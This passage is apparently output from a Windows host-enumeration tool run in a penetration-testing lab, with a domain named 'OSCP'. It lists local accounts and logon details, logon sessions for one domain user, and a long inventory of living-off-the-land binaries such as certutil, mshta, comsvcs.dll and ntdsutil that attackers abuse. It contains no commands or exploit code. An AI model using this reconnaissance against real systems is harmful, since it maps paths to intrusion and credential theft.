  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 10/9/2024 10:39:03 AM
  LastLogon                      : 2/22/2026 8:56:44 AM
  NumLogins                      : 33

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
  UserType                       : Guest
  Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : jenkins
  Enabled                        : True
  Rid                            : 1001
  UserType                       : User
  Comment                        : 
  PwdLastSet                     : 10/9/2024 12:54:28 PM
  LastLogon                      : 11/11/2024 10:28:34 AM
  NumLogins                      : 9

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 10/9/2024 2:16:19 PM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonEvents ======

ERROR: Unable to collect. Must be an administrator/in a high integrity context.
====== LogonSessions ======

Logon Sessions (via WMI)


  UserName              : b.martin
  Domain                : OSCP
  LogonId               : 1185965
  LogonType             : RemoteInteractive
  AuthenticationPackage : Kerberos
  StartTime             : 2/22/2026 8:58:43 AM
  UserPrincipalName     : 

  UserName              : b.martin
  Domain                : OSCP
  LogonId               : 5027606
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 2/22/2026 2:10:17 PM
  UserPrincipalName     : 
====== LOLBAS ======

Path: C:\Windows\System32\advpack.dll
Path: C:\Windows\SysWOW64\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.17763.1_none_d082ca37b5d3d7c3\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.17763.1_none_dad77489ea3499be\advpack.dll
Path: C:\Windows\System32\at.exe
Path: C:\Windows\SysWOW64\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.17763.1_none_3dc78e4edc0df1b1\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.17763.1_none_481c38a1106eb3ac\at.exe
Path: C:\Windows\System32\AtBroker.exe
Path: C:\Windows\SysWOW64\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.1_none_c06699b6767ea3f0\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.17763.1_none_cabb4408aadf65eb\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.1_none_3061487514bb83f7\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.615_none_b48460e84223a6d0\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.615_none_b48460e84223a6d0\f\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.615_none_b48460e84223a6d0\r\bash.exe
Path: C:\Windows\System32\bitsadmin.exe
Path: C:\Windows\SysWOW64\bitsadmin.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.17763.1_none_3dd77ae7649577fa\bitsadmin.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.17763.1_none_482c253998f639f5\bitsadmin.exe
Path: C:\Windows\System32\certutil.exe
Path: C:\Windows\SysWOW64\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.1_none_a64af1d28b85fec8\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.17763.1_none_b09f9c24bfe6c0c3\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-audiodiagnostic_31bf3856ad364e35_10.0.17763.1_none_b14d5ceb47e2e05b\CL_Invocation.ps1
Path: C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1
Path: C:\Windows\WinSxS\amd64_microsoft-windows-videodiagnostic_31bf3856ad364e35_10.0.17763.1_none_6da811f997075340\CL_MutexVerifiers.ps1
Path: C:\Windows\diagnostics\system\Video\CL_MutexVerifiers.ps1
Path: C:\Windows\System32\cmd.exe
Path: C:\Windows\SysWOW64\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.592_none_ff9c46f1a031aea0\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.592_none_09f0f143d492709b\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.592_none_ff9c46f1a031aea0\f\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.592_none_ff9c46f1a031aea0\r\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.592_none_09f0f143d492709b\f\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.17763.592_none_09f0f143d492709b\r\cmd.exe
Path: C:\Windows\System32\cmdkey.exe
Path: C:\Windows\SysWOW64\cmdkey.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.17763.1_none_cdad5caa35016f49\cmdkey.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.17763.1_none_d80206fc69623144\cmdkey.exe
Path: C:\Windows\System32\cmstp.exe
Path: C:\Windows\SysWOW64\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rascmak.resources_31bf3856ad364e35_10.0.17763.1_en-us_2c0cad1684b8d27b\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.1_none_4fe62956b8aef8eb\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.17763.1_none_5a3ad3a8ed0fbae6\cmstp.exe
Path: C:\Windows\System32\comsvcs.dll
Path: C:\Windows\SysWOW64\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.1_none_63884f12f80766f9\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.17763.1_none_6ddcf9652c6828f4\comsvcs.dll
Path: C:\Windows\System32\control.exe
Path: C:\Windows\SysWOW64\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.1_none_8a31e32302a74069\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.17763.1_none_94868d7537080264\control.exe
Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_75029b843b5b1af7\csc.exe
Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15713.0_none_bcafd25b4fd743fd\csc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
Path: C:\Windows\System32\cscript.exe
Path: C:\Windows\SysWOW64\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.134_none_bd3aabce85fcad18\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.17763.134_none_c78f5620ba5d6f13\cscript.exe
Path: C:\Windows\System32\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.17763.652_none_b5ad0eb0605e1257\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_netfx4-dfsvc_b03f5f7f11d50a3a_4.0.15713.0_none_a43786f92b366cab\dfsvc.exe
Path: C:\Windows\WinSxS\msil_dfsvc_b03f5f7f11d50a3a_4.0.15713.0_none_069772df8b7f60fe\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\dfsvc\v4.0_4.0.0.0__b03f5f7f11d50a3a\dfsvc.exe
Path: C:\Windows\System32\diskshadow.exe
Path: C:\Windows\SysWOW64\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.17763.1_none_262eee7884162127\diskshadow.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-vssdiskshadow_31bf3856ad364e35_10.0.17763.1_none_ca1052f4cbb8aff1\diskshadow.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.1_none_d7fc21f9a64ab1bb\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.719_none_5c233d7ad3af3717\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.719_none_5c233d7ad3af3717\f\dnscmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-dns-server-dnscmd_31bf3856ad364e35_10.0.17763.719_none_5c233d7ad3af3717\r\dnscmd.exe
Path: C:\Windows\System32\esentutl.exe
Path: C:\Windows\SysWOW64\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.529_none_4e6e1eac4ad73428\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.529_none_58c2c8fe7f37f623\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.529_none_4e6e1eac4ad73428\f\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.529_none_4e6e1eac4ad73428\r\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.529_none_58c2c8fe7f37f623\f\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.17763.529_none_58c2c8fe7f37f623\r\esentutl.exe
Path: C:\Windows\System32\eventvwr.exe
Path: C:\Windows\SysWOW64\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.17763.1_none_e5bdc1ec5bdc8ffe\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.17763.1_none_f0126c3e903d51f9\eventvwr.exe
Path: C:\Windows\System32\expand.exe
Path: C:\Windows\SysWOW64\expand.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-expand_31bf3856ad364e35_10.0.17763.1_none_49386661b009dd04\expand.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-expand_31bf3856ad364e35_10.0.17763.1_none_538d10b3e46a9eff\expand.exe
Path: C:\Program Files\internet explorer\ExtExport.exe
Path: C:\Program Files (x86)\Internet Explorer\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.17763.1_none_52b5255e8688e021\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.17763.1_none_f69689dace2b6eeb\ExtExport.exe
Path: C:\Windows\System32\extrac32.exe
Path: C:\Windows\SysWOW64\extrac32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.17763.1_none_cbef84845c0ecfaa\extrac32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.17763.1_none_d6442ed6906f91a5\extrac32.exe
Path: C:\Windows\System32\findstr.exe
Path: C:\Windows\SysWOW64\findstr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-findstr_31bf3856ad364e35_10.0.17763.1_none_17f57547b1de1380\findstr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-findstr_31bf3856ad364e35_10.0.17763.1_none_224a1f99e63ed57b\findstr.exe
Path: C:\Windows\System32\forfiles.exe
Path: C:\Windows\SysWOW64\forfiles.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.17763.1_none_45e9598535b23646\forfiles.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.17763.1_none_503e03d76a12f841\forfiles.exe
Path: C:\Windows\System32\ftp.exe
Path: C:\Windows\SysWOW64\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.17763.1_none_9db147d5b0b369b2\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.17763.1_none_a805f227e5142bad\ftp.exe
Path: C:\Windows\System32\gpscript.exe
Path: C:\Windows\SysWOW64\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1_none_55dd2267c7d5aee9\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.17763.1_none_6031ccb9fc3670e4\gpscript.exe
Path: C:\Windows\hh.exe
Path: C:\Windows\SysWOW64\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.475_none_3cfe15b70a7eb741\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.17763.475_none_4752c0093edf793c\hh.exe
Path: C:\Windows\System32\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.652_none_7e438ae20da293eb\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.652_none_7e438ae20da293eb\f\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.17763.652_none_7e438ae20da293eb\r\ie4uinit.exe
Path: C:\Windows\System32\IEAdvpack.dll
Path: C:\Windows\SysWOW64\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.17763.1_none_f3a9af329191e4a6\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.17763.1_none_978b13aed9347370\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15713.0_none_5dfa66e22bfd5c70\ilasm.exe
Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15713.0_none_a5a79db940798576\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe
Path: C:\Windows\System32\InfDefaultInstall.exe
Path: C:\Windows\SysWOW64\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.17763.1_none_5d5a6da4f438d5f5\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.17763.1_none_67af17f7289997f0\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_installutil_b03f5f7f11d50a3a_4.0.15713.0_none_d4948e9d0f25af26\InstallUtil.exe
Path: C:\Windows\WinSxS\x86_installutil_b03f5f7f11d50a3a_4.0.15713.0_none_1c41c57423a1d82c\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Path: C:\Windows\WinSxS\amd64_jsc_b03f5f7f11d50a3a_4.0.15713.0_none_00f10a3ec57c2b75\jsc.exe
Path: C:\Windows\WinSxS\x86_jsc_b03f5f7f11d50a3a_4.0.15713.0_none_489e4115d9f8547b\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
Path: C:\Windows\System32\makecab.exe
Path: C:\Windows\SysWOW64\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1_none_e1956bcbc16844da\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.17763.1_none_ebea161df5c906d5\makecab.exe
Path: C:\Windows\System32\mavinject.exe
Path: C:\Windows\SysWOW64\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.719_none_2826d1ae77f4b67b\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.17763.719_none_327b7c00ac557876\mavinject.exe
Path: C:\Windows\WinSxS\amd64_netfx4-microsoft.workflow.compiler_b03f5f7f11d50a3a_4.0.15713.0_none_582c8c015167cad5\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\WinSxS\msil_microsoft.workflow.compiler_31bf3856ad364e35_4.0.15713.0_none_31438b4fdc7273c6\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\v4.0_4.0.0.0__31bf3856ad364e35\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\System32\mmc.exe
Path: C:\Windows\SysWOW64\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.1_none_003934f5cdcbaab6\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.17763.1_none_0a8ddf48022c6cb1\mmc.exe
Path: C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15713.0_none_da500ddf9f3ce843\MSBuild.exe
Path: C:\Windows\WinSxS\x86_msbuild_b03f5f7f11d50a3a_4.0.15713.0_none_21fd44b6b3b91149\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\System32\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.17763.1_none_cb402868f5e97c8d\msconfig.exe
Path: C:\Windows\System32\msdt.exe
Path: C:\Windows\SysWOW64\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.1_none_96484bd875afe57a\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.17763.1_none_a09cf62aaa10a775\msdt.exe
Path: C:\Windows\System32\mshta.exe
Path: C:\Windows\SysWOW64\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.17763.1_none_7e1153fecc60d8b3\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.17763.1_none_8865fe5100c19aae\mshta.exe
Path: C:\Windows\System32\mshtml.dll
Path: C:\Windows\SysWOW64\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.737_none_cabf8cfa616ad427\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.737_none_d514374c95cb9622\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.737_none_cabf8cfa616ad427\f\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.737_none_cabf8cfa616ad427\r\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.737_none_d514374c95cb9622\f\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.17763.737_none_d514374c95cb9622\r\mshtml.dll
Path: C:\Windows\System32\msiexec.exe
Path: C:\Windows\SysWOW64\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.404_none_be7442fb0ba441e4\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.404_none_c8c8ed4d400503df\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.404_none_be7442fb0ba441e4\f\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.404_none_be7442fb0ba441e4\r\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.404_none_c8c8ed4d400503df\f\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.17763.404_none_c8c8ed4d400503df\r\msiexec.exe
Path: C:\Windows\System32\netsh.exe
Path: C:\Windows\SysWOW64\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-netsh_31bf3856ad364e35_10.0.17763.1_none_5066e02350023e4e\netsh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-netsh_31bf3856ad364e35_10.0.17763.1_none_5abb8a7584630049\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.1_none_cc17025f87bcc81a\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.503_none_5042e844b51e9f2d\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.1_none_6ff866dbcf5f56e4\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.503_none_f4244cc0fcc12df7\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.503_none_5042e844b51e9f2d\f\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.503_none_5042e844b51e9f2d\r\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.503_none_f4244cc0fcc12df7\f\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.17763.503_none_f4244cc0fcc12df7\r\ntdsutil.exe
Path: C:\Windows\System32\odbcconf.exe
Path: C:\Windows\SysWOW64\odbcconf.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.17763.1_none_fe3cc4624a46a1fe\odbcconf.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.17763.1_none_a21e28de91e930c8\odbcconf.exe
Path: C:\Windows\System32\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.17763.737_none_a89beb0ea8c6f8b6\pcalua.exe
Path: C:\Windows\System32\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.1_none_e5f1b7c957d1804f\pcwrun.exe
Path: C:\Windows\System32\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.17763.1_none_e5f1b7c957d1804f\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.1_none_c4f85489cbfa475b\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.17763.1_none_cf4cfedc005b0956\Pester.bat
Path: C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Windows\System32\PresentationHost.exe
Path: C:\Windows\SysWOW64\PresentationHost.exe
Path: C:\Windows\WinSxS\amd64_wpf-presentationhostexe_31bf3856ad364e35_10.0.17763.1_none_60ba1d3678474a35\PresentationHost.exe
Path: C:\Windows\WinSxS\x86_wpf-presentationhostexe_31bf3856ad364e35_10.0.17763.1_none_049b81b2bfe9d8ff\PresentationHost.exe
Path: C:\Windows\System32\print.exe
Path: C:\Windows\SysWOW64\print.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_6de2d78cbf7e0077\print.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.17763.1_none_783781def3dec272\print.exe
Path: C:\Windows\System32\psr.exe
Path: C:\Windows\SysWOW64\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1_none_cbb77b11a3232eea\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.17763.1_none_d60c2563d783f0e5\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_83a32950d1d8064b\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_8df7d3a30638c846\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_27848dcd197a9515\pubprn.vbs
Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_83a32950d1d8064b\f\pubprn.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_83a32950d1d8064b\r\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_8df7d3a30638c846\f\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_8df7d3a30638c846\r\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_27848dcd197a9515\f\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.17763.107_en-us_27848dcd197a9515\r\pubprn.vbs
Path: C:\Windows\System32\rasautou.exe
Path: C:\Windows\SysWOW64\rasautou.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.17763.1_none_009fe89bbd7c8b5f\rasautou.exe
